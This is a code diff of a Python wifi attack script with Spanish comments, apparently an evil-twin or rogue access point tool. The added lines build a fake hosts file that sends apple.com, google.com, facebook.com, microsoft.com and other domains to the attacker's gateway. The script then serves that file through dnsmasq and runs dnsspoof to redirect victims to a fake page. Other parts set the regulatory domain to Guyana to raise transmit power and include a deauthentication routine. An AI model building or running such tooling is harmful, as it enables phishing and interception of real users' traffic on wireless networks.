@@ -225,6 +225,7 @@ def monitor_iface(target_interface):
         sys.exit()
     os.system("airmon-ng start %s 1>/dev/null" % (target_interface))
     interface = str(target_interface)
+    #interface = str(target_interface)+'mon'
     return interface
 
 def iface_txpower(interface,mode,txpower):
@@ -237,7 +238,7 @@ def iface_txpower(interface,mode,txpower):
         if target_txpower == 's':
             print "\nCambiando la potencia de la %s ..." % (interface)
             os.system("ifconfig %s down" % (interface))
-            os.system("iw reg set GY") #GY o BO
+            os.system("iw reg set GY") #GY = Guyana o BO = Bolivia
             os.system("ifconfig %s up" % (interface))
             os.system("iwconfig %s txpower 30" % (interface))
             os.system("iw %s info" % interface)
@@ -279,9 +280,26 @@ def run_dnsmasq(interface,first_ip,last_ip,mask,gateway):
       outF.write("\n")
     outF.close()
 
+    # Crear archivo de fakehosts el cual se encargara de redireccionar a los usuarios conectados.
+    fakehosts_text = [gateway+'    apple.com',
+                      gateway+'    google.com',
+                      gateway+'    microsoft.com',
+                      gateway+'    facebook.com',
+                      gateway+'    samsung.com',
+                      gateway+'    twitter.com',
+                      gateway+'    ejemplo.com',
+                      gateway+'    telmex.com'
+                     ]
+    # Crear archivo fakehosts.conf
+    outF = open("fakehosts.conf", "w")
+    for line in fakehosts_text:
+      # Escribimos cada linea en nuestro archivo de configuracion
+      outF.write(line)
+      outF.write("\n")
+    outF.close()
+
     # Creamos DHCP con dnsmasq
-    gateway_dhcp = ['echo '+gateway+' www.google.com > dnsspoof.conf',
-                    'ifconfig '+interface+' '+'up '+gateway+' netmask '+mask,
+    gateway_dhcp = ['ifconfig '+interface+' '+'up '+gateway+' netmask '+mask,
                     'iptables --flush',
                     'iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE',
                     'iptables --append FORWARD --in-interface '+interface+' -j ACCEPT',
@@ -303,7 +321,7 @@ def run_dnsmasq(interface,first_ip,last_ip,mask,gateway):
     outF.close()
     # Subproceso
     print "\nCreando DHCP para el AP Falso"
-    p = subprocess.Popen(["xterm", "-e", "dnsmasq", "-C", "./dnsmasq.conf", "-d"])
+    p = subprocess.Popen(["xterm", "-e", "dnsmasq", "-C", "./dnsmasq.conf", "-H", "./fakehosts.conf", "-d"])
 
 def conf_dnsmasq(mode,interface,first_ip,last_ip,mask,gateway):
     '''
@@ -371,7 +389,7 @@ def dnsspoof(interface):
     Creacion de un DNS spoofing
     '''
     print "\nRedireccionando el trafico a la pagina falsa..."
-    p = subprocess.Popen(["xterm", "-e", "dnsspoof", "-i", interface, "-f", "./dnsspoof.conf"])
+    p = subprocess.Popen(["xterm", "-e", "dnsspoof", "-i", interface])
 
 def desAuthentication(interface,bssid):
     '''
